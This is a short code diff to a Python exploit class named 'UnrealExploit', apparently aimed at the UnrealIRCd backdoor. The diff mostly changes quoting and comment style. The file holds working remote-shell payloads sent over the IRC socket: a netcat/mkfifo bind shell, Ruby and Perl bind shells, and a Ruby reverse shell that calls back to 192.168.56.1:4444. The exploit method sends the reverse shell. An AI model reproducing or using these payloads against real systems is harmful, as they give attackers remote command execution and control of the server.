@@ -12,9 +12,9 @@ class UnrealExploit:
         self.__port = None
         self.__cmd = None
         self.netcat = b"AB; mkfifo /tmp/xnfkexe; (nc -l -p 4444 ||nc -l 4444)0</tmp/xnfkexe | /bin/sh >/tmp/xnfkexe 2>&1; rm /tmp/xnfkexe"
-        self.bindruby = b"AB; ruby -rsocket -e 'exit if fork;s=TCPServer.new(\"40000\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'"
+        self.bindruby = b'AB; ruby -rsocket -e \'exit if fork;s=TCPServer.new("40000");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end;end\''
         self.bindperl = b"AB; perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'"
-        self.revruby = b"AB;ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"192.168.56.1\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        self.revruby = b'AB;ruby -rsocket -e \'exit if fork;c=TCPSocket.new("192.168.56.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
 
     def __connect(self):
         self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,9 +37,9 @@ class UnrealExploit:
     def __exploit(self):
         print(self.__sock.recv(1024))
         print(self.__sock.recv(1024))
-        #self.__sock.send(bytes(self.__cmd, "utf-8"))
-        #self.__sock.send(self.netcat)
-#        self.__sock.send(self.bindruby)
+        # self.__sock.send(bytes(self.__cmd, "utf-8"))
+        # self.__sock.send(self.netcat)
+        #        self.__sock.send(self.bindruby)
         self.__sock.send(self.revruby)
         print("[+] Payload sent...")
         self.__sock.close()
